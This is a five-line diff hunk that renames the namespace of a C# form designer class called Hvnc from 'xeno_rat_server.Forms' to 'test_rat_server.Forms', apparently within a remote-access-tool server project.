@@ -1,5 +1,5 @@
 ﻿
-namespace xeno_rat_server.Forms
+namespace test_rat_server.Forms
 {
     partial class Hvnc
     {
